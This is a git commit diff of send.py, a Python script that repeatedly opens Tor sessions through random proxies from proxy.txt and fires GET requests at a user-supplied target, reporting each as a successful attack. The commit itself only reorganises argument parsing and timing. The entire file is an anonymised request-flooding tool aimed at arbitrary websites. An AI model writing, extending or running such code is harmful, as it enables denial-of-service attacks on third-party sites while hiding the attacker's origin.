2c732b973ce60cf3601a9dac7777cc20da72d1d9
Elmy711 <elmiya0711@gmail.com>
2026-06-03 16:08:41 +0700

    update

--- send.py
+++ send.py
@@ -1,8 +1,7 @@
 import datetime
 import sys
 import random
-from lib.tor import To
-
+from lib.tor import Tor
 
 # Definisi warna
 RED = '\033[91m'
@@ -16,24 +15,31 @@ ORANGE = '\033[38;5;208m'
 PURPLE = '\033[38;5;141m'
 END = '\033[0m'
 
+# Processing args from lib.args
+from lib.args import *
+args = parser.parse_args()
+target = args.target
+max_attempts = args.max_attempts
+
+# Print help and exit when it runs without target arg
+if not target:
+    parser.print_help(sys.stdout)
+    sys.exit(2)
 
 def main():
     counter = 0
+    start_time = datetime.datetime.now()
     try:
         tor = Tor()
         if not tor.tor_installed():
             print(f'{RED}[!]{END} Tor is not installed. Exiting...')
             sys.exit(1)
-
-        start_time = datetime.datetime.now().time().strftime('%H:%M:%S')
-
         try:
             with open('proxy.txt', 'r') as f:
                 proxies = [line.strip() for line in f if line.strip()]
         except FileNotFoundError:
             print(f'{RED}[!]{END} File proxy.txt tidak ditemukan.')
             sys.exit(1)
-
         while counter < max_attempts:
             counter += 1
             proxy = random.choice(proxies)
@@ -41,25 +47,22 @@ def main():
             if session is None:
                 print(f'{RED}[!]{END} Failed to initialize Tor session. Exiting...')
                 sys.exit(1)
-
             print(f'{BLUE}[!]{END} New Tor session initialized...')
             print(f'\n{PURPLE}[+]{END} Target: {PURPLE}{target}{END}')
-
             try:
                 print(f'{ORANGE}[*]{END} Getting data from {target}...')
                 session.get(target)
                 print(f'{ORANGE}[*]{END} Target {target} was attacked succesfully')
             except Exception as e:
                 print(f'{RED}[!]{END} Error: {e}')
-
     except KeyboardInterrupt:
         pass
     except Exception as exception:
         print(f'\n{RED}[!]{END} An error has occurred:')
         print(f'{RED}{exception}{END}')
     finally:
-        end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
-        total_time = datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S')
+        end_time = datetime.datetime.now()
+        total_time = end_time - start_time
         print(f'{GREEN}[+]{END} Time elapsed:\t{total_time}')
         print(f'{GREEN}[+]{END} Number of requests:\t{counter}')
         print(f'{RED}[!]{END} Stopping Tor...')
@@ -68,13 +71,4 @@ def main():
         sys.exit(0)
 
 if __name__ == '__main__':
-    # Processing args from lib.args import *
-    args = parser.parse_args()
-    target = args.target
-    max_attempts = args.max_attempts
-    # Print help and exit when it runs without target arg
-    if not target:
-        parser.print_help(sys.stdout)
-        sys.exit(2)
-    # Run the main execution
     main()
